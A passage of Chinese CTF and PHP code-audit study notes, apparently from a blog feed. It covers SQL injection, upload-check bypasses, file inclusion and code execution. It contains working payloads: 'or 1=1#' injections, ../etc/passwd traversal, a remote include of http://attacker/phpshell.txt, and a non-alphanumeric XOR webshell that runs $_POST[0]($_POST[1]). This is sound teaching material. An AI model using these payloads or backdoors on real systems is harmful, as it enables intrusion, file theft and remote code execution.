title="数字型注入"></a>数字型注入</h3><h4 id="1-核心特征"><a href="#1-核心特征" class="headerlink" title="1. 核心特征"></a>1. 核心特征</h4><ul><li><p>注入参数直接拼接在SQL语句中，<strong>未被引号包裹</strong>。</p></li><li><p>示例测试：输入 <code>id=2-1</code> 仍能查出数据（本质执行 <code>id=1</code> 的查询逻辑）。</p></li></ul><h4 id="2-关键语法与用法"><a href="#2-关键语法与用法" class="headerlink" title="2. 关键语法与用法"></a>2. 关键语法与用法</h4><ul><li><p><strong>union 联合查询</strong>：可将两个 <code>select</code> 语句的结果合并，要求两语句<strong>列数相同</strong>。</p></li><li><p>拼接后示例语句：</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure></li><li><p><strong>limit 关键字</strong>：用于控制查询结果的返回条数（限制列数&#x2F;行数）。</p></li></ul><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><h4 id="1-核心特征-1"><a href="#1-核心特征-1" class="headerlink" title="1. 核心特征"></a>1. 核心特征</h4><ul><li><p>注入参数被引号（单引号&#x2F;双引号）包裹，需先<strong>逃逸引号</strong>才能注入。</p></li><li><p>示例PHP代码（存在注入漏洞）：</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$conn</span>=<span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select id from users where username=&#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br></code></pre></td></tr></table></figure></li></ul><h4 id="2-注入思路与步骤"><a href="#2-注入思路与步骤" class="headerlink" title="2. 注入思路与步骤"></a>2. 注入思路与步骤</h4><ol><li><p><strong>闭合引号</strong>：输入单引号 <code>&#39;</code> 打破原SQL语句的引号平衡。</p></li><li><p><strong>构造条件</strong>：使用 <code>or</code> 拼接恒真条件（如 <code>1=1</code>），使查询返回所有结果。</p></li><li><p><strong>注释后续</strong>：用 <code>#</code> 注释掉原语句中多余的引号和代码（避免语法错误）。</p></li></ol><h4 id="3-示例操作"><a href="#3-示例操作" class="headerlink" title="3. 示例操作"></a>3. 示例操作</h4><ul><li><p>注入输入（需URL编码）：<code>username=&#39;or1=1#</code></p><ul><li>URL编码后：<code>username=%27or%201=1%23</code></li></ul></li><li><p>实际执行的SQL语句：</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure></li><li><p>逻辑说明：<code>or</code> 连接两个表达式，第一个表达式（<code>&#39;&#39;</code> 匹配）为假，第二个（<code>1=1</code>）为真，最终返回所有用户的id（示例中仅1条数据，返回id&#x3D;1）。</p></li></ul><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="1-核心特征-2"><a href="#1-核心特征-2" class="headerlink" title="1. 核心特征"></a>1. 核心特征</h4><ul><li><p>不直接返回查询结果，仅通过页面反馈（如“user exist”&#x2F;“user not exist”）判断查询是否成功。</p></li><li><p>示例PHP代码（布尔盲注场景）：</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$conn</span>=<span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select id from users where username=&#x27;&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&quot;&#x27;&quot;</span>);<br><span class="hljs-variable">$count</span>=<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$count</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user exist&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user not exist&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="2-注入思路：逐字符猜解"><a href="#2-注入思路：逐字符猜解" class="headerlink" title="2. 注入思路：逐字符猜解"></a>2. 注入思路：逐字符猜解</h4><ul><li>利用字符串截取函数（如 <code>substr</code>），逐位验证目标字段（如密码）的字符。</li></ul><h4 id="3-关键函数：substr"><a href="#3-关键函数：substr" class="headerlink" title="3. 关键函数：substr"></a>3. 关键函数：substr</h4><ul><li><p>语法：<code>substr(字符串, 起始位置, 截取长度)</code></p></li><li><p>示例：<code>substr(password,1,1)</code> 表示截取 <code>password</code> 字段的第1个字符（起始位置从1开始）。</p></li></ul><h4 id="4-示例操作"><a href="#4-示例操作" class="headerlink" title="4. 示例操作"></a>4. 示例操作</h4><ul><li><p>猜解密码第1个字符：注入输入（URL编码）：<code>username=%27or%20substr(password,1,1)=%271%27%23</code></p></li><li><p>实际执行的SQL语句：</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span> substr(password,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span>#<br></code></pre></td></tr></table></figure></li><li><p>逻辑说明：若密码第1个字符是 <code>1</code>，页面返回“user exist”；否则返回“user not exist”（示例中密码第1个字符为 <code>3</code>，故返回“user not exist”）。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码审计</title>
    <link href="/2025/11/08/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/11/08/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h4 id="绕过上传检查"><a href="#绕过上传检查" class="headerlink" title="绕过上传检查"></a>绕过上传检查</h4><ul><li><p>前端检查扩展名</p><p>抓包绕过即可。</p></li><li><p><code>Content-Type</code> 检测文件类型</p><p>抓包修改 <code>Content-Type</code> 类型，使其符合白名单规则。</p></li><li><p>服务端添加后缀</p><p>尝试 <code>%00</code> 截断。</p></li><li><p>服务端扩展名检测</p><p>利用解析漏洞。</p></li><li><p>Apache 解析</p><p>Apache 对后缀解析是从右向左的</p><p><code>phpshell.php.rar.rar.rar.rar</code> 因为 Apache 不认识 <code>.rar</code> 这个文件类型，所以会一直遍历后缀到 <code>.php</code>，然后认为这是一个 PHP 文件。</p></li><li><p>IIS 解析</p><p>IIS 6 下当文件名为 <code>abc.asp;xx.jpg</code> 时，会将其解析为 <code>abc.asp</code>。</p></li><li><p>PHP CGI 路径解析</p><p>当访问 <code>http://www.a.com/path/test.jpg/notexist.php</code> 时，会将 <code>test.jpg</code> 当做 PHP 解析， <code>notexist.php</code> 是不存在的文件。此时 Nginx 的配置如下</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;<br>  <span class="hljs-attribute">root</span> html;<br>  <span class="hljs-attribute">fastcgi_pass</span> <span class="hljs-number">127.0.0.1:9000</span>;<br>  <span class="hljs-attribute">fastcgi_index</span> index.php;<br>  <span class="hljs-attribute">fastcgi_param</span> SCRIPT_FILENAME /scripts<span class="hljs-variable">$fastcgi_script_name</span>;<br>  <span class="hljs-attribute">include</span> fastcgi_param;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>其他方式</p><p>后缀大小写、双写、特殊后缀如 <code>php5</code> 等，修改包内容的大小写过 WAF 等。</p></li></ul><p><a href="https://blog.csdn.net/m0_59598029/article/details/138793923">文件上传漏洞（全网最详细）</a></p><p><a href="https://blog.csdn.net/weixin_46684578/article/details/119141109">文件上传之 .htaccess文件getshell</a></p><p><a href="https://blog.csdn.net/lza20001103/article/details/124427171">文件上传漏洞之MIME type验证原理和绕过</a></p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>常见的导致文件包含的函数有：</p><ul><li>PHP：<code>include()</code>，<code>include_once()</code>，<code>require()</code>，<code>require_once()</code>，<code>fopen()</code>，<code>readfile()</code> 等</li><li>JSP Servlet：<code>ava.io.File()</code>，<code>java.io.FileReader()</code> 等</li><li>ASP：<code>includefile</code>，<code>includevirtual</code> 等</li></ul><p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。</p><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>本地文件包含，Local File Inclusion，LFI。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/home/wwwrun/&#x27;</span>.<span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;.php&#x27;</span>)) &#123;<br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/home/wwwrun/&#x27;</span>.<span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上述代码存在本地文件包含，可用 %00 截断的方式读取 <code>/etc/passwd</code> 文件内容。</p><ul><li><p><code>%00</code> 截断</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。</p></li><li><p>路径长度截断</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/.[…]/</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>./.<br></code></pre></td></tr></table></figure><p>Linux 需要文件名长于 4096，Windows 需要长于 256。</p></li></ul><p><a href="https://www.cnblogs.com/xinghaihe/p/18416524">本地文件包含漏洞详解与CTF实战 </a></p><p><a href="/html/taishan.html">伪协议过滤绕过</a></p><h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$route</span> == <span class="hljs-string">&quot;share&quot;</span>) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$basePath</span> . <span class="hljs-string">&quot;/action/m_share.php&quot;</span>;<br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$route</span> == <span class="hljs-string">&quot;sharelink&quot;</span>) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$basePath</span> . <span class="hljs-string">&quot;/action/m_sharelink.php&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>构造变量 <code>basePath</code> 的值。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?basePath=http:/</span><span class="hljs-regexp">/attacker/</span>phpshell.txt?<br></code></pre></td></tr></table></figure><p>最终的代码执行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;http://attacker/phpshell.txt?/action/m_share.php&quot;</span>;<br></code></pre></td></tr></table></figure><p>问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。</p><p><img src="https://pic1.imgdb.cn/item/693d6f5ffe7cfeca3822eec5.png"></p><ul><li><p>普通远程文件包含</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=[<span class="hljs-keyword">http</span>|<span class="hljs-keyword">https</span>|<span class="hljs-keyword">ftp</span>]://example.com/<span class="hljs-built_in">shell</span>.txt<br></code></pre></td></tr></table></figure><p>需要 <code>allow_url_fopen=On</code> 并且 <code>allow_url_include=On</code> 。</p></li><li><p>利用 PHP 流 input</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?<span class="hljs-keyword">file</span>=php:<span class="hljs-comment">//input</span><br></code></pre></td></tr></table></figure><p>需要 <code>allow_url_include=On</code> 。</p></li><li><p>利用 PHP 流 filter</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">convert</span>.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure><p>需要 <code>allow_url_include=On</code> 。</p></li><li><p>利用 data URIs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,SSBsb3ZlIFBIUAo=<br></code></pre></td></tr></table></figure><p>需要 <code>allow_url_include=On</code> 。</p></li><li><p>利用 XSS 执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/path/</span>xss.php?xss=phpcode<br></code></pre></td></tr></table></figure><p>需要 <code>allow_url_fopen=On</code>，<code>allow_url_include=On</code> 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。</p></li></ul><p><a href="https://konwait12.github.io/my-kon-blog/posts/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><strong>PHP伪协议详解</strong></a></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="直接执行代码"><a href="#直接执行代码" class="headerlink" title="直接执行代码"></a>直接执行代码</h3><p>PHP 中有不少可以直接执行代码的函数。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>();<br><span class="hljs-built_in">assert</span>();<br><span class="hljs-built_in">system</span>();<br><span class="hljs-built_in">exec</span>();<br><span class="hljs-built_in">shell_exec</span>();<br><span class="hljs-built_in">passthru</span>();<br><span class="hljs-built_in">escapeshellcmd</span>();<br><span class="hljs-built_in">pcntl_exec</span>();<br>......<br></code></pre></td></tr></table></figure><h3 id="preg-replace-代码执行"><a href="#preg-replace-代码执行" class="headerlink" title="preg_replace() 代码执行"></a><code>preg_replace()</code> 代码执行</h3><p><code>preg_replace()</code> 的第一个参数如果存在 <code>/e</code> 模式修饰符，则允许代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;&lt;tag&gt;phpinfo()&lt;/tag&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/&lt;tag&gt;(.*?)&lt;\/tag&gt;/e&quot;</span>, <span class="hljs-string">&quot;addslashes(\\1)&quot;</span>, <span class="hljs-variable">$var</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果没有 <code>/e</code> 修饰符，可以尝试 %00 截断。</p><h3 id="preg-match-代码执行"><a href="#preg-match-代码执行" class="headerlink" title="preg_match 代码执行"></a><code>preg_match</code> 代码执行</h3><p><code>preg_match</code> 执行的是匹配正则表达式，如果匹配成功，则允许代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Long.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>    &#125;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><details><summary>点击这里展开详细内容</summary><p>这道题是 <code>xman</code> 训练赛的时候，梅子酒师傅出的一道题。这一串代码描述是这样子，我们要绕过 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 <code>a-z</code> 中任意一个字符，并且字符串长度小于 <code>40</code> 。然后再利用 <code>PHP</code> 允许动态函数执行的特点，拼接出一个函数名，这里我们是 <code>getFlag</code>，然后动态执行该代码即可。</p><p>那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到 <code>getFlag</code> 函数，然后拿到 <code>webshell</code> 。</p><p>在理解这个之前，我们首先需要大家了解的是 <code>PHP</code> 中异或 <code>^</code> 的概念。</p><p>我们先看一下下面这段代码：</p><pre><code class="hljs">&lt;?php    echo &quot;A&quot;^&quot;?&quot;;?&gt;</code></pre><p>运行结果如下：</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer1.png"></p><p>我们可以看到，输出的结果是字符 <code>~</code>。之所以会得到这样的结果，是因为代码中对字符 <code>A</code> 和字符 <code>?</code> 进行了异或操作。在 <code>PHP</code> 中，两个变量进行异或时，先会将字符串转换成 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成二进制再进行异或，异或完，又将结果从二进制转换成了 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成字符串。异或操作有时也被用来交换两个变量的值。</p><p>比如像上面这个例子</p><p><code>A</code> 的 <code>ASCII</code> 值是 <code>65</code> ，对应的二进制值是 <code>01000001</code></p><p><code>?</code> 的ASCII值是 <code>63</code> ，对应的二进制值是 <code>00111111</code></p><p>异或的二进制的值是 <code>‭01111110‬</code> ，对应的 <code>ASCII</code> 值是 <code>126</code> ，对应的字符串的值就是 <code>~</code> 了</p><p>我们都知道， <code>PHP</code> 是弱类型的语言，也就是说在 <code>PHP</code> 中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于 <code>PHP</code> 弱类型的这个特点，我们对 <code>PHP</code> 的变量类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：</p><pre><code class="hljs">&lt;?php    function B()&#123;        echo &quot;Hello Angel_Kitty&quot;;    &#125;    $_++;    $__= &quot;?&quot; ^ &quot;&#125;&quot;;    $__();?&gt;</code></pre><p>代码执行结果如下：</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer2.png"></p><p>我们一起来分析一下上面这段代码：</p><p>1、<code>$_++;</code> 这行代码的意思是对变量名为 <code>&quot;_&quot;</code> 的变量进行自增操作，在 <code>PHP</code> 中未定义的变量默认值 <code>null</code> ，<code>null==false==0</code> ，我们可以在不使用任何数字的情况下，通过对未定义变量的自增操作来得到一个数字。</p><p>2、<code>$__=&quot;?&quot; ^ &quot;&#125;&quot;;</code> 对字符 <code>?</code> 和 <code>&#125;</code> 进行异或运算，得到结果 <code>B</code> 赋给变量名为 <code>__</code> (两个下划线)的变量</p><p>3、<code>$ __ ();</code> 通过上面的赋值操作，变量 <code>$__</code> 的值为 <code>B</code> ，所以这行可以看作是 <code>B()</code> ，在 <code>PHP</code> 中，这行代码表示调用函数 <code>B</code> ，所以执行结果为 <code>Hello Angel_Kitty</code> 。在 <code>PHP</code> 中，我们可以将字符串当作函数来处理。</p><p>看到这里，相信大家如果再看到类似的 <code>PHP</code> 后门应该不会那么迷惑了，你可以通过一句句的分析后门代码来理解后门想实现的功能。</p><p>我们希望使用这种后门创建一些可以绕过检测的并且对我们有用的字符串，如 <code>_POST</code> ， <code>system</code> ， <code>call_user_func_array</code>，或者是任何我们需要的东西。</p><p>下面是个非常简单的非数字字母的 <code>PHP</code> 后门：</p><pre><code class="hljs">&lt;?php    @$_++; // $_ = 1    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _    $__.=(&quot;.&quot;^&quot;~&quot;); // _P    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS    $__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST     $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);?&gt;</code></pre><p>在这里我说明下， <code>.=</code> 是字符串的连接，具体参看 <code>PHP</code> 语法</p><p>我们甚至可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：</p><pre><code class="hljs">$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);</code></pre><p>我们回到 <code>xman</code> 训练赛的那题来看，我们的想法是通过构造异或来去绕过那串字符，那么我们该如何构造这个字串使得长度小于 <code>40</code> 呢？</p><p>我们最终是要读取到那个 <code>getFlag</code> 函数，我们需要构造一个 <code>_GET</code> 来去读取这个函数，我们最终构造了如下字符串：</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/payloads.png"></p><p>可能很多小伙伴看到这里仍然无法理解这段字符串是如何构造的吧，我们就对这段字符串进行段分析。</p><h4>构造 <code>_GET</code> 读取</h4><p>首先我们得知道 <code>_GET</code> 由什么异或而来的，经过我的尝试与分析，我得出了下面的结论：</p><pre><code class="hljs">&lt;?php    echo &quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;//_GET?&gt;</code></pre><p>这段代码一大坨是啥意思呢？因为40个字符长度的限制，导致以前逐个字符异或拼接的webshell不能使用。<br/>这里可以使用php中可以执行命令的反引号 <code>`</code> 和 <code>Linux</code> 下面的通配符 <code>?</code></p><ul><li><code>?</code> 代表匹配一个字符</li><li><code>`</code> 表示执行命令</li><li><code>&quot;</code> 对特殊字符串进行解析</li>    <p>由于 <code>?</code> 只能匹配一个字符，这种写法的意思是循环调用，分别匹配。我们将其进行分解来看：</p><pre><code class="hljs">&lt;?php    echo &quot;&#123;&quot;^&quot;&lt;&quot;;?&gt;</code></pre><p>输出结果为：</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer3.png"></p><pre><code class="hljs">&lt;?php    echo &quot;&#123;&quot;^&quot;&gt;&quot;;?&gt;</code></pre><p>输出结果为：</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer4.png"></p><pre><code class="hljs">&lt;?php    echo &quot;&#123;&quot;^&quot;/&quot;;?&gt;</code></pre><p>输出结果为：</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer5.png"></p><p>所以我们可以知道， <code>_GET</code> 就是这么被构造出来的啦！</p><h4>获取 <code>_GET</code> 参数</h4><p>我们又该如何获取 <code>_GET</code> 参数呢？咱们可以构造出如下字串：</p><pre><code class="hljs">&lt;?php    echo $&#123;$_&#125;[_]($&#123;$_&#125;[__]);//$_GET[_]($_GET[__])?&gt;</code></pre><p>根据前面构造的来看， <code>$_</code> 已经变成了 <code>_GET</code> 。顺理成章的来讲， <code>$_ = _GET</code> 。我们构建 <code>$_GET[__]</code> 是为了要获取参数值。</p><h4>传入参数</h4><p>此时我们只需要去调用 <code>getFlag</code> 函数获取 <code>webshell</code> 就好了，构造如下：</p><pre><code class="hljs">&lt;?php    echo $_=getFlag;//getFlag?&gt;</code></pre><p>所以把参数全部连接起来，就可以了。</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/payloads.png"></p><p>结果如下：</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/flag.png"></p><p>于是我们就成功地读取到了flag！</p></details><h3 id="动态函数执行"><a href="#动态函数执行" class="headerlink" title="动态函数执行"></a>动态函数执行</h3><p>用户自定义的函数可以导致代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dyn_func</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;dyn_func&quot;</span>];<br><span class="hljs-variable">$argument</span> = <span class="hljs-variable">$_GET</span>[<span 